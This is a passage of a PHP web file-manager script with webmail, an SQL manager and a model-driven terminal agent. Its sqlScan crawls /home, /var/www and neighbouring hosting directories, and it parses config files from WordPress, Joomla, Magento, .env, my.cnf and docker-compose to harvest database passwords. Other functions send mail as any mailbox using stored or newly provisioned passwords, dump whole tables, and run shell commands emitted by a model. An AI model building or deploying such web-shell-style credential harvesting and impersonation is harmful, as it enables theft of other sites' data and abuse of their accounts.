        if(!$imap){$this->addMsg('Could not open a mail session for this mailbox.','danger');return;}
        $msgno=@imap_msgno($imap,(int)$uid);
        if(!$msgno){imap_close($imap);$this->addMsg('Message not found.','danger');return;}
        imap_delete($imap,(string)$msgno);imap_expunge($imap);imap_close($imap);
        $this->log('webmail_delete',$mailbox);
    }

    private function wmEncodeHeader($s){
        return preg_match('/[^\x20-\x7E]/',$s)?('=?UTF-8?B?'.base64_encode($s).'?='):$s;
    }

    /** Hand-rolled RFC5321 client (EHLO/AUTH PLAIN/MAIL/RCPT/DATA) — kept
     *  minimal and dependency-free so it works against any SMTP server the
     *  auto-connect tiers point at. */
    private function wmSmtpSend($from,$pass,$to,$subject,$body){
        $host=$_SESSION['webmail_host'];$port=(int)$_SESSION['webmail_smtp_port'];
        $sock=@fsockopen($host,$port,$errno,$errstr,8);
        if(!$sock)return['ok'=>false,'error'=>"Could not reach the SMTP server: $errstr"];
        stream_set_timeout($sock,12);
        $read=function()use($sock){
            $line='';
            do{$chunk=fgets($sock,515);if($chunk===false)break;$line=$chunk;}while(isset($chunk[3])&&$chunk[3]==='-');
            return $line;
        };
        $read(); // banner
        fwrite($sock,"EHLO fm-webmail\r\n");$read();
        fwrite($sock,'AUTH PLAIN '.base64_encode("\0".$from."\0".$pass)."\r\n");
        $r=$read();
        if(substr($r,0,3)!=='235'){fclose($sock);return['ok'=>false,'error'=>'SMTP authentication failed.'];}
        fwrite($sock,"MAIL FROM:<$from>\r\n");$r=$read();
        if(substr($r,0,3)!=='250'){fclose($sock);return['ok'=>false,'error'=>'Sender rejected: '.trim($r)];}
        foreach((array)$to as $rcpt){
            $rcpt=trim($rcpt);if($rcpt==='')continue;
            fwrite($sock,"RCPT TO:<$rcpt>\r\n");$r=$read();
            if(substr($r,0,3)!=='250'){fclose($sock);return['ok'=>false,'error'=>"Recipient rejected ($rcpt): ".trim($r)];}
        }
        fwrite($sock,"DATA\r\n");$r=$read();
        if(substr($r,0,3)!=='354'){fclose($sock);return['ok'=>false,'error'=>'Server refused DATA: '.trim($r)];}
        $headers="Date: ".date('r')."\r\nFrom: $from\r\nTo: ".implode(', ',(array)$to)
            ."\r\nSubject: ".$this->wmEncodeHeader($subject)."\r\nMessage-ID: <".bin2hex(random_bytes(8))."@fm-webmail>"
            ."\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8\r\n";
        $stuffed=preg_replace('/\r\n\./','\r\n..',$body);
        fwrite($sock,$headers."\r\n".$stuffed."\r\n.\r\n");
        $r=$read();
        fwrite($sock,"QUIT\r\n");@fclose($sock);
        if(substr($r,0,3)!=='250')return['ok'=>false,'error'=>'Delivery failed: '.trim($r)];
        return['ok'=>true];
    }

    public function webmailSend(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $c=$this->webmailAutoConnect();
        if(!$c['ok']){$this->addMsg('No mail server auto-detected.','danger');return;}
        $from=trim($_POST['wm_from']??'');
        $to=trim($_POST['wm_to']??'');
        $subject=trim($_POST['wm_subject']??'(No subject)');
        $body=(string)($_POST['wm_body']??'');
        if(!$from||!$to){$this->addMsg('From and To are required.','danger');return;}
        $pass=null;
        if($_SESSION['webmail_mode']==='cpanel_api'){
            $pass=$this->wmProvisionMailboxPassword($from);
        } else {
            foreach($this->wmParsePasswdFile($_SESSION['webmail_passdb']) as $e){
                if($e['user']===$from){$pass=$this->wmPlainSecret($e['secret']);break;}
            }
        }
        if($pass===null){
            $this->addMsg('Sending is unavailable for this mailbox: its password is stored as a one-way hash on this host, so it cannot be auto-authenticated for SMTP without ever asking a human for it.','danger');
            return;
        }
        $recipients=array_filter(array_map('trim',preg_split('/[,;]+/',$to)));
        $r=$this->wmSmtpSend($from,$pass,$recipients,$subject,$body);
        if(!$r['ok']){$this->addMsg($r['error'],'danger');return;}
        $this->addMsg('Message sent.','success');
        $this->log('webmail_send',"$from -> $to");
    }

    /* ══════════════════════════════════════════════════════════════
       SQL DATABASE MANAGER
    ══════════════════════════════════════════════════════════════ */
    public function sqlScan(){
        $found=[];$seen=[];
        $envDb=fm_guardian_env_db();
        $candidates=[
            '/var/www','/srv/www','/srv','/home','/opt','/data',
            $this->root,$this->currentDir,getcwd(),
            dirname($_SERVER['SCRIPT_FILENAME']??''),
            $_SERVER['DOCUMENT_ROOT']??null,
            dirname($_SERVER['DOCUMENT_ROOT']??''),
        ];
        $obd=ini_get('open_basedir');
        if($obd){foreach(explode(PATH_SEPARATOR,$obd)as $p)$candidates[]=rtrim($p,'/');}
        $home=dirname(dirname($_SERVER['SCRIPT_FILENAME']??$this->root?:''));
        foreach([$home,dirname($home)]as $h){
            if($h&&is_dir($h)){
                foreach(['public_html','www','htdocs','domains','httpdocs']as $sub)$candidates[]=$h.'/'.$sub;
                $candidates[]=$h;
            }
        }
        $roots=array_unique(array_filter($candidates,fn($r)=>$r&&is_dir($r)&&@is_readable($r)));
        $cfgNames=['wp-config.php','configuration.php','.env','.env.local','.env.production','.env.development','.env.example',
            'config.php','config/database.php','application/config/database.php','config/config.php',
            'sites/default/settings.php','sites/default/settings.local.php','include/config.php','includes/config.php','inc/config.php',
            'includes/configure.php','includes/configure.php.bak',
            'app/etc/env.php','app/etc/local.xml',
            'app/config/parameters.php','app/config/parameters.yml','config/parameters.php',
            'config/settings.inc.php','settings.inc.php',
            'LocalSettings.php',
            'typo3conf/LocalConfiguration.php',
            'config.core.php','config.inc.php',
            'app/config/app.php','config/app.php',
            'protected/config/main.php',
            '.my.cnf','my.cnf','docker-compose.yml','docker-compose.yaml',
        ];
        $maxDirs=2000;$scanned=0;
        $GLOBALS['_sqlfound']=[];
        $scan=function($dir,$depth)use(&$scan,&$seen,&$scanned,$maxDirs,$cfgNames){
            if($depth>7||$scanned>=$maxDirs)return;
            $dir=rtrim($dir,'/');$real=realpath($dir);
            if(!$real||isset($seen[$real]))return;$seen[$real]=1;$scanned++;
            foreach($cfgNames as $cf){
                $fp=$dir.'/'.$cf;
                if(!file_exists($fp)||!is_readable($fp))continue;
                $fp=realpath($fp);if(!$fp||isset($seen['f:'.$fp]))continue;
                $seen['f:'.$fp]=1;
                $creds=$this->sqlExtractCreds($fp);
                if($creds)$GLOBALS['_sqlfound'][]=['file'=>$fp,'host'=>$creds['host'],'port'=>$creds['port'],'user'=>$creds['user'],'pass'=>$creds['pass'],'db'=>$creds['db'],'type'=>$creds['type'],'driver'=>'mysql'];
            }
            $skip=['node_modules','.git','vendor','.cache','.local','proc','sys','dev','run','tmp','var','usr','boot'];
            $entries=@scandir($dir)?:[];
            foreach($entries as $e){
                if($e==='.'||$e==='..'||in_array($e,$skip))continue;
                $sub=$dir.'/'.$e;
                if(!is_link($sub)&&is_dir($sub)){$scan($sub,$depth+1);if($scanned>=$maxDirs)break;}
            }
        };
        foreach($roots as $r)$scan($r,0);
        $found=$GLOBALS['_sqlfound'];unset($GLOBALS['_sqlfound']);
        if($envDb){
            array_unshift($found,['file'=>'DATABASE_URL (project environment)','host'=>$envDb['host'],'port'=>$envDb['port'],
                'user'=>$envDb['user'],'pass'=>$envDb['pass'],'db'=>$envDb['name'],
                'type'=>$envDb['driver']==='pgsql'?'postgresql':'mysql','driver'=>$envDb['driver']]);
        }
        $obdList=$obd?array_filter(explode(PATH_SEPARATOR,$obd)):[];
        return['databases'=>$found,'open_basedir'=>array_values($obdList),'scanned'=>$scanned];
    }
    public function sqlExtractCreds($fp){
        $src=@file_get_contents($fp);if($src===false)return null;
        $base=basename($fp);
        $c=['host'=>'localhost','port'=>3306,'user'=>'','pass'=>'','db'=>'','type'=>'generic'];
        if($base==='wp-config.php'){
            $c['type']='wordpress';
            $g=fn($n)=>preg_match('/define\s*\(\s*[\'"]'.$n.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\)/s',$src,$m)?$m[1]:null;
            if($v=$g('DB_NAME'))$c['db']=$v;
            if($v=$g('DB_USER'))$c['user']=$v;
            if($v=$g('DB_PASSWORD'))$c['pass']=$v;
            if($v=$g('DB_HOST')){if(strpos($v,':')!==false){[$c['host'],$pt]=explode(':',$v,2);$c['port']=(int)$pt;}else $c['host']=$v;}
        } elseif($base==='configuration.php'){
            $c['type']='joomla';
            $g=fn($n)=>preg_match('/public\s+\$'.$n.'\s*=\s*[\'\"](.*?)[\'\"]\s*;/s',$src,$m)?$m[1]:null;
            if($v=$g('host'))$c['host']=$v;
            if($v=$g('user'))$c['user']=$v;
            if($v=$g('password'))$c['pass']=$v;
            if($v=$g('db'))$c['db']=$v;
            if(($v=$g('dbport'))&&(int)$v)$c['port']=(int)$v;
        } elseif(strpos($base,'.env')===0){
            $c['type']='env';
            $g=function($n)use($src){
                if(preg_match('/^\s*'.$n.'\s*=\s*"([^"]*)"\s*$/mi',$src,$m))return $m[1];
                if(preg_match('/^\s*'.$n.'\s*=\s*\'([^\']*)\'\s*$/mi',$src,$m))return $m[1];
                if(preg_match('/^\s*'.$n.'\s*=\s*([^\r\n]*)$/mi',$src,$m))return trim($m[1]);
                return null;
            };
            if($v=$g('DB_DATABASE')?:$g('DATABASE_NAME')?:$g('MYSQL_DATABASE'))$c['db']=$v;
            if($v=$g('DB_USERNAME')?:$g('DATABASE_USER')?:$g('MYSQL_USER'))$c['user']=$v;
            if($v=$g('DB_PASSWORD')?:$g('DATABASE_PASSWORD')?:$g('MYSQL_PASSWORD'))$c['pass']=$v;
            if($v=$g('DB_HOST')?:$g('DATABASE_HOST')?:$g('MYSQL_HOST'))$c['host']=$v;
            if($v=$g('DB_PORT')?:$g('DATABASE_PORT')?:$g('MYSQL_PORT'))$c['port']=(int)$v;
            if(!$c['db']&&preg_match('#DATABASE_URL\s*=\s*"?\'?mysql://([^:@/"\']+):?([^@/"\']*)@([^:/"\']+):?(\d*)/([^"\'\s]+)#i',$src,$m)){
                $c['user']=$m[1];$c['pass']=$m[2];$c['host']=$m[3];if($m[4])$c['port']=(int)$m[4];$c['db']=$m[5];
            }
        } elseif($base==='settings.php'||$base==='settings.local.php'){
            $c['type']='drupal';
            $g=fn($n)=>preg_match('/[\'"]'.$n.'[\'"]\s*=>\s*[\'"]([^\'"]*)[\'"]/i',$src,$m)?$m[1]:null;
            if($v=$g('database'))$c['db']=$v;
            if($v=$g('username'))$c['user']=$v;
            if($v=$g('password'))$c['pass']=$v;
            if($v=$g('host'))$c['host']=$v;
            if($v=$g('port'))$c['port']=(int)$v;
        } elseif($base==='env.php'){
            $c['type']='magento2';
            $g=fn($n)=>preg_match('/[\'"]'.$n.'[\'"]\s*=>\s*[\'"]([^\'"]*)[\'"]/i',$src,$m)?$m[1]:null;
            if($v=$g('dbname'))$c['db']=$v;
            if($v=$g('username'))$c['user']=$v;
            if($v=$g('password'))$c['pass']=$v;
            if($v=$g('host')){if(strpos($v,':')!==false){[$c['host'],$pt]=explode(':',$v,2);if($pt!=='')$c['port']=(int)$pt;}else $c['host']=$v;}
        } elseif($base==='local.xml'){
            $c['type']='magento1';
            $g=fn($n)=>preg_match('#<'.$n.'><!\[CDATA\[(.*?)\]\]></'.$n.'>#is',$src,$m)?$m[1]:(preg_match('#<'.$n.'>(.*?)</'.$n.'>#is',$src,$m)?$m[1]:null);
            if($v=$g('dbname'))$c['db']=$v;
            if($v=$g('username'))$c['user']=$v;
            if($v=$g('password'))$c['pass']=$v;
            if($v=$g('host')){if(strpos($v,':')!==false){[$c['host'],$pt]=explode(':',$v,2);if($pt!=='')$c['port']=(int)$pt;}else $c['host']=$v;}
        } elseif($base==='parameters.php'||$base==='parameters.yml'||$base==='settings.inc.php'){
            $c['type']='prestashop';
            $g=fn($n)=>preg_match('/'.$n.'[\'"]?\s*[:=>]+\s*[\'"]?([^\'"\r\n,]*)[\'"]?/i',$src,$m)?trim($m[1]):null;
            if($v=$g('database_name')?:$g('db_name')?:$g('_DB_NAME_'))$c['db']=$v;
            if($v=$g('database_user')?:$g('db_user')?:$g('_DB_USER_'))$c['user']=$v;
            if($v=$g('database_password')?:$g('db_password')?:$g('_DB_PASSWD_'))$c['pass']=$v;
            if($v=$g('database_host')?:$g('db_server')?:$g('_DB_SERVER_'))$c['host']=$v;
        } elseif($base==='LocalSettings.php'){
            $c['type']='mediawiki';
            $g=fn($n)=>preg_match('/\$wg'.$n.'\s*=\s*[\'"]([^\'"]*)[\'"]/i',$src,$m)?$m[1]:null;
            if($v=$g('DBname'))$c['db']=$v;
            if($v=$g('DBuser'))$c['user']=$v;
            if($v=$g('DBpassword'))$c['pass']=$v;
            if($v=$g('DBserver'))$c['host']=$v;
        } elseif($base==='.my.cnf'||$base==='my.cnf'){
            $c['type']='my.cnf';
            $g=fn($n)=>preg_match('/^\s*'.$n.'\s*=\s*(.*)$/mi',$src,$m)?trim($m[1],"\"' \t"):null;
            if($v=$g('user'))$c['user']=$v;
            if($v=$g('password'))$c['pass']=$v;
            if($v=$g('host'))$c['host']=$v;
            if($v=$g('port'))$c['port']=(int)$v;
            if($v=$g('socket'))$c['host']=$v;
        } elseif($base==='docker-compose.yml'||$base==='docker-compose.yaml'){
            $c['type']='docker';
            $g=fn($n)=>preg_match('/'.$n.'\s*:?=?\s*[\'"]?([^\'"\r\n]*)[\'"]?/i',$src,$m)?trim($m[1]):null;
            if($v=$g('MYSQL_DATABASE')?:$g('MARIADB_DATABASE'))$c['db']=$v;
            if($v=$g('MYSQL_USER')?:$g('MARIADB_USER'))$c['user']=$v;
            if($v=$g('MYSQL_PASSWORD')?:$g('MARIADB_PASSWORD'))$c['pass']=$v;
            if(!$c['user']&&($v=$g('MYSQL_ROOT_PASSWORD')?:$g('MARIADB_ROOT_PASSWORD'))){$c['user']='root';$c['pass']=$v;}
            $c['host']='127.0.0.1';
        } else {
            if(preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i",$src,$m))$c['db']=$m[1];
            elseif(preg_match("/['\"]database['\"]\s*=>\s*['\"]([^'\"]+)['\"]/i",$src,$m))$c['db']=$m[1];
            elseif(preg_match('/\$(?:db(?:name|Name|_name)?|database)\s*=\s*[\'"]([^\'"]+)[\'"]/i',$src,$m))$c['db']=$m[1];
            if(preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i",$src,$m))$c['user']=$m[1];
            elseif(preg_match("/['\"]username['\"]\s*=>\s*['\"]([^'\"]+)['\"]/i",$src,$m))$c['user']=$m[1];
            elseif(preg_match('/\$(?:db_?user|user(?:name)?)\s*=\s*[\'"]([^\'"]+)[\'"]/i',$src,$m))$c['user']=$m[1];
            if(preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i",$src,$m))$c['pass']=$m[1];
            elseif(preg_match("/['\"]password['\"]\s*=>\s*['\"]([^'\"]+)['\"]/i",$src,$m))$c['pass']=$m[1];
            elseif(preg_match('/\$(?:db_?pass(?:word)?|password)\s*=\s*[\'"]([^\'"]+)[\'"]/i',$src,$m))$c['pass']=$m[1];
            if(preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i",$src,$m))$c['host']=$m[1];
            elseif(preg_match("/['\"]host['\"]\s*=>\s*['\"]([^'\"]+)['\"]/i",$src,$m))$c['host']=$m[1];
            elseif(preg_match('/\$(?:db_?host|host(?:name)?)\s*=\s*[\'"]([^\'"]+)[\'"]/i',$src,$m))$c['host']=$m[1];
        }
        if(!$c['host'])$c['host']='localhost';
        if(!$c['db']&&!$c['user'])return null;
        return $c;
    }
    private function sqlBuildConn(){
        return[
            isset($_POST['sql_host'])?trim($_POST['sql_host']):'localhost',
            isset($_POST['sql_port'])?(int)$_POST['sql_port']:3306,
            isset($_POST['sql_user'])?$_POST['sql_user']:'',
            isset($_POST['sql_pass'])?$_POST['sql_pass']:'',
            isset($_POST['sql_db'])?trim($_POST['sql_db']):'',
            isset($_POST['sql_driver'])&&$_POST['sql_driver']==='pgsql'?'pgsql':'mysql',
        ];
    }
    private function sqlConn($h,$pt,$u,$pw,$db,$driver='mysql'){
        if($driver==='pgsql'){
            if(!class_exists('PDO')||!in_array('pgsql',PDO::getAvailableDrivers(),true))return[null,'PDO PostgreSQL support is not available on this server.'];
            try{
                $dsn='pgsql:host='.$h.';port='.(int)($pt?:5432).';dbname='.$db;
                $link=new PDO($dsn,$u,$pw,[PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION,PDO::ATTR_DEFAULT_FETCH_MODE=>PDO::FETCH_ASSOC]);
                return[$link,null];
            }catch(Throwable $e){return[null,'Connection failed: '.$e->getMessage()];}
        }
        if(!function_exists('mysqli_connect'))return[null,'MySQLi extension is not available on this server.'];
        $sock=null;if($h&&strlen($h)>0&&$h[0]==='/')$sock=$h;
        if($sock)$link=@mysqli_connect('localhost',$u,$pw,$db,3306,$sock);
        else $link=@mysqli_connect($h,$u,$pw,$db,(int)($pt?:3306));
        if(!$link)return[null,'Connection failed: '.mysqli_connect_error()];
        mysqli_set_charset($link,'utf8mb4');
        return[$link,null];
    }
    public function sqlListTables(){
        [$h,$pt,$u,$pw,$db,$driver]=$this->sqlBuildConn();
        [$link,$err]=$this->sqlConn($h,$pt,$u,$pw,$db,$driver);
        if($err)return['error'=>$err];
        $tables=[];
        if($link instanceof PDO){
            try{
                $res=$link->query("SELECT table_name,0::bigint AS table_rows,pg_total_relation_size(format('%I.%I','public',table_name)::regclass) AS table_size,'table' AS engine FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE' ORDER BY table_name");
                foreach($res as $row)$tables[]=['name'=>$row['table_name'],'rows'=>(int)$row['table_rows'],'size'=>(int)$row['table_size'],'engine'=>$row['engine']];
                $dbs=[];$dr=$link->query("SELECT datname FROM pg_database WHERE datallowconn=true ORDER BY datname");
                foreach($dr as $row)$dbs[]=$row['datname'];
            }catch(Throwable $e){return['error'=>'PostgreSQL query failed: '.$e->getMessage()];}
        }else{
            $res=mysqli_query($link,'SHOW TABLE STATUS');
            if($res){while($row=mysqli_fetch_assoc($res))$tables[]=['name'=>$row['Name'],'rows'=>(int)($row['Rows']??0),'size'=>(int)($row['Data_length']??0)+(int)($row['Index_length']??0),'engine'=>$row['Engine']??''];}
            $dbsRes=mysqli_query($link,'SHOW DATABASES');$dbs=[];
            if($dbsRes){while($r=mysqli_fetch_row($dbsRes))$dbs[]=$r[0];}
            mysqli_close($link);
        }
        return['tables'=>$tables,'db'=>$db,'databases'=>$dbs];
    }
    public function sqlBrowse(){
        [$h,$pt,$u,$pw,$db,$driver]=$this->sqlBuildConn();
        $table=isset($_POST['sql_table'])?trim($_POST['sql_table']):'';
        $page=max(1,(int)(isset($_POST['sql_page'])?$_POST['sql_page']:1));
        $per=50;
        [$link,$err]=$this->sqlConn($h,$pt,$u,$pw,$db,$driver);
        if($err)return['error'=>$err];
        if($link instanceof PDO){
            $tE='"'.str_replace('"','""',$table).'"';
            try{
                $total=(int)$link->query("SELECT COUNT(*) FROM $tE")->fetchColumn();
                $cols=[];$colRes=$link->query("SELECT column_name AS \"Field\",data_type AS \"Type\" FROM information_schema.columns WHERE table_schema='public' AND table_name=".$link->quote($table)." ORDER BY ordinal_position");
                foreach($colRes as $r)$cols[]=['name'=>$r['Field'],'type'=>$r['Type']];
                $rows=[];$offset=($page-1)*$per;$dr=$link->query("SELECT * FROM $tE LIMIT $per OFFSET $offset");
                foreach($dr as $r)$rows[]=array_values($r);
                return['columns'=>$cols,'rows'=>$rows,'total'=>$total,'page'=>$page,'perPage'=>$per,'table'=>$table,'db'=>$db,'pages'=>(int)ceil(max($total,1)/$per)];
            }catch(Throwable $e){return['error'=>'PostgreSQL query failed: '.$e->getMessage()];}
        }
        $tE=mysqli_real_escape_string($link,$table);
        $total=0;$cr=mysqli_query($link,"SELECT COUNT(*) AS c FROM `$tE`");
        if($cr){$rw=mysqli_fetch_assoc($cr);$total=(int)$rw['c'];}
        $cols=[];$colRes=mysqli_query($link,"SHOW COLUMNS FROM `$tE`");
        if($colRes)while($r=mysqli_fetch_assoc($colRes))$cols[]=['name'=>$r['Field'],'type'=>$r['Type']];
        $rows=[];$offset=($page-1)*$per;
        $dr=mysqli_query($link,"SELECT * FROM `$tE` LIMIT $per OFFSET $offset");
        if($dr)while($r=mysqli_fetch_row($dr))$rows[]=$r;
        mysqli_close($link);
        return['columns'=>$cols,'rows'=>$rows,'total'=>$total,'page'=>$page,'perPage'=>$per,'table'=>$table,'db'=>$db,'pages'=>(int)ceil(max($total,1)/$per)];
    }
    public function sqlRunQuery(){
        [$h,$pt,$u,$pw,$db,$driver]=$this->sqlBuildConn();
        $sql=isset($_POST['sql_query'])?trim($_POST['sql_query']):'';
        if(!$sql)return['error'=>'Empty query.'];
        [$link,$err]=$this->sqlConn($h,$pt,$u,$pw,$db,$driver);
        if($err)return['error'=>$err];
        if($link instanceof PDO){
            try{
                $res=$link->query($sql);$out=['affected'=>$res instanceof PDOStatement?0:$res,'columns'=>[],'rows'=>[],'insert_id'=>null,'error'=>null,'limited'=>false];
                if($res instanceof PDOStatement){
                    $out['columns']=array_map(fn($m)=>$m->getColumnMeta(0)['name']??'',array_filter(range(0,max(0,$res->columnCount()-1)),fn($i)=>true));
                    $cnt=0;while($row=$res->fetch(PDO::FETCH_NUM)){ $out['rows'][]=$row;if(++$cnt>=500)break; }
                    $out['limited']=$cnt>=500;
                }else $out['affected']=$link->exec($sql);
                return $out;
            }catch(Throwable $e){return['affected'=>0,'columns'=>[],'rows'=>[],'insert_id'=>null,'error'=>$e->getMessage(),'limited'=>false];}
        }
        $res=mysqli_query($link,$sql);
        $out=['affected'=>mysqli_affected_rows($link),'columns'=>[],'rows'=>[],'insert_id'=>mysqli_insert_id($link),'error'=>null,'limited'=>false];
        if($res===false){$out['error']=mysqli_error($link);}
        elseif(is_object($res)){
            $fi=mysqli_fetch_fields($res);if($fi)foreach($fi as $f)$out['columns'][]=$f->name;
            $cnt=0;while($row=mysqli_fetch_row($res)){$out['rows'][]=$row;if(++$cnt>=500)break;}
            $out['limited']=($cnt>=500);mysqli_free_result($res);
        }
        mysqli_close($link);return $out;
    }
    public function sqlExport(){
        [$h,$pt,$u,$pw,$db,$driver]=$this->sqlBuildConn();
        $table=isset($_POST['sql_table'])?trim($_POST['sql_table']):'';
        $fmt=isset($_POST['sql_fmt'])?$_POST['sql_fmt']:'sql';
        if(!$table){header('Content-Type: application/json');echo json_encode(['error'=>'No table specified.']);exit;}
        [$link,$err]=$this->sqlConn($h,$pt,$u,$pw,$db,$driver);
        if($err){header('Content-Type: application/json');echo json_encode(['error'=>$err]);exit;}
        $safeName=preg_replace('/[^a-zA-Z0-9_\-]/','',$table);
        if($link instanceof PDO){
            $tE='"'.str_replace('"','""',$table).'"';
            try{
                $res=$link->query("SELECT * FROM $tE");
                if($fmt==='csv'){
                    header('Content-Type: text/csv;charset=utf-8');header('Content-Disposition: attachment; filename="'.$safeName.'.csv"');
                    $first=true;
                    while($row=$res->fetch(PDO::FETCH_ASSOC)){
                        if($first){echo implode(',',array_map(fn($v)=>'"'.str_replace('"','""',(string)$v).'"',array_keys($row)))."\r\n";$first=false;}
                        echo implode(',',array_map(fn($v)=>$v===null?'':'"'.str_replace('"','""',(string)$v).'"',array_values($row)))."\r\n";
                    }
                }else{
                    header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.$safeName.'.sql"');
                    echo "-- SQL Export: `$table` from `$db`\n-- Generated: ".date('Y-m-d H:i:s')."\n\n";
                    while($row=$res->fetch(PDO::FETCH_NUM)){
                        $vals=implode(',',array_map(fn($v)=>$v===null?'NULL':$link->quote((string)$v),$row));
                        echo "INSERT INTO ".$tE." VALUES ($vals);\n";
                    }
                }
            }catch(Throwable $e){header('Content-Type: application/json');echo json_encode(['error'=>$e->getMessage()]);}
            exit;
        }
        $tE=mysqli_real_escape_string($link,$table);
        if($fmt==='csv'){
            header('Content-Type: text/csv;charset=utf-8');
            header('Content-Disposition: attachment; filename="'.$safeName.'.csv"');
            $res=mysqli_query($link,"SELECT * FROM `$tE`");
            if($res){
                $first=true;
                while($row=mysqli_fetch_assoc($res)){
                    if($first){echo implode(',',array_map(fn($hdr)=>'"'.str_replace('"','""',$hdr).'"',array_keys($row)))."\r\n";$first=false;}
                    echo implode(',',array_map(fn($v)=>$v===null?'':'"'.str_replace('"','""',(string)$v).'"',array_values($row)))."\r\n";
                }
            }
        } else {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.$safeName.'.sql"');
            echo "-- SQL Export: `$table` from `$db`\n-- Generated: ".date('Y-m-d H:i:s')."\n\nSET NAMES utf8mb4;\n\n";
            $cr=mysqli_query($link,"SHOW CREATE TABLE `$tE`");
            if($cr){$rw=mysqli_fetch_row($cr);echo "DROP TABLE IF EXISTS `$tE`;\n".$rw[1].";\n\n";}
            $res=mysqli_query($link,"SELECT * FROM `$tE`");
            $buf='';
            if($res){
                while($row=mysqli_fetch_row($res)){
                    $vals=implode(',',array_map(fn($v)=>$v===null?'NULL':"'".mysqli_real_escape_string($link,(string)$v)."'",$row));
                    $buf.="INSERT INTO `$tE` VALUES ($vals);\n";
                    if(strlen($buf)>65536){echo $buf;$buf='';}
                }
                if($buf)echo $buf;
            }
        }
        mysqli_close($link);exit;
    }
}

function fm_agent_action_label($type){
    $labels=['terminal'=>'ran terminal','delete'=>'Deleting item','rename'=>'Renaming item','copy'=>'Copying item','move'=>'Moving item','create'=>'Creating file','mkdir'=>'Creating folder','duplicate'=>'Duplicating file','extract'=>'Extracting archive'];
    return $labels[$type]??'Running action';
}
function fm_agent_parse_step($text){
    $segments=[];$buffer=[];$lines=preg_split('/\r\n|\n|\r/',(string)$text);
    $flush=function()use(&$buffer,&$segments){$value=trim(implode("\n",$buffer));if($value!=='')$segments[]=['type'=>'message','text'=>$value];$buffer=[];};
    foreach($lines as $line){
        if(preg_match('/^\s*\[(terminal|file(?::(delete|rename|copy|move|create|mkdir|duplicate|extract))?)\]\s*(.*?)\s*$/i',$line,$m)){
            $flush();$kind=strtolower($m[1]);$sub=strtolower($m[2]??'');
            $type=$kind==='terminal'?'terminal':($sub?:'terminal');
            return ['segments'=>$segments,'action'=>['kind'=>$type==='terminal'?'terminal':'file','action'=>$type,'label'=>fm_agent_action_label($type),'command'=>trim($m[3]??'')]];
        }
        $buffer[]=$line;
    }
    $flush();
    return ['segments'=>$segments,'action'=>null];
}
function fm_agent_execute_action($action,$fm){
    $type=$action['action']??'terminal';$arg=trim((string)($action['command']??''));
    if($type==='terminal'){
        if($fm->isRO())$result=['ok'=>false,'output'=>'Read-only account: terminal execution is disabled.','exit'=>1];
        else $result=$fm->runCmd($arg);
        $output=(string)($result['output']??'');if($output==='')$output=($result['exit']??0)===0?'Command completed with no output.':'Command failed.';
        $action['output']=$output;$action['ok']=($result['exit']??0)===0;
    }else{
        $result=$fm->agentFileAction($type,$arg);$action['output']=(string)($result['output']??'');$action['ok']=!empty($result['ok']);
    }
    return $action;
}
function fm_agent_continuation_prompt($history,$cwd,$userMessage,$action){
    $result=mb_substr((string)($action['output']??''),0,10000);
    return fm_agent_prompt($history,$cwd,$userMessage)."\n\n"
        ."LIVE EXECUTION RESULT (this is authoritative; do not invent a different result):\n"
        ."Action: [".$action['action']."] ".($action['command']??'')."\n"
        ."Success: ".(!empty($action['ok'])?'yes':'no')."\n"
        ."Output:\n".$result."\n\n"
        ."Continue the conversation naturally. Explain what you found or what failed. If another operation is required, say what you will do and emit exactly one next marker on its own line, then stop. Otherwise give the final answer without any marker.";
}
function fm_agent_prompt($history,$cwd,$userMessage){
    $context=[];$recent=array_slice(is_array($history)?$history:[],-24);
    foreach($recent as $item){
        if(!is_array($item)||!isset($item['role'],$item['content']))continue;
        $role=$item['role']==='assistant'?'Assistant':'User';
        $context[]=$role.': '.mb_substr((string)$item['content'],0,2400);
    }
    $transcript=implode("\n",$context);
    return "Current directory: ".$cwd."\nConversation so far:\n".($transcript?:'(new conversation)')."\n\nUser request:\n".$userMessage;
}

$fm=new FileManager();
/* Automatically provision the default detected WordPress recovery after a
   successful File Manager login. This is intentionally authenticated-only:
   a public login-page request must never mutate an arbitrary CMS. */
if(!empty($_SESSION['fm_admin']))$fm->wpAutomationAutoBootstrap();

/* ── API ── */
if(isset($_GET['x'])){
    header('Content-Type: application/json');
    if(!isset($_SESSION['auth'])||$_SESSION['auth']!==true){echo json_encode(['error'=>'Unauthorized']);exit;}
    $xop=$_GET['x'];
    if($xop==='fm_change_default_credentials'){
        if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||!hash_equals((string)($_SESSION['csrf_token']??''),(string)$_POST['csrf_token'])){echo json_encode(['error'=>'Security error.']);exit;}
        echo json_encode(fm_change_default_credentials($usersFile,$_POST['new_user']??'',$_POST['new_pass']??'',$_POST['confirm_pass']??''));exit;
    }
    if($xop==='set_theme'){
        global $themeFile;
        $t=isset($_POST['theme'])?$_POST['theme']:(isset($_GET['theme'])?$_GET['theme']:'');
        echo json_encode(['ok'=>true,'theme'=>fm_save_theme($themeFile,$t)]);exit;
    }
    if($xop==='agent_history'){
        echo json_encode(['ok'=>true,'messages'=>fm_agent_load()],JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);exit;
    }
    if($xop==='agent_config'){
        $cfg=fm_agent_config_load();$key=(string)($cfg['gemini_api_key']??'');
        echo json_encode(['ok'=>true,'configured'=>$key!=='','masked'=>$key!==''?substr($key,0,5).'••••••••'.substr($key,-4):'']);exit;
    }
    if($xop==='agent_config_save'){
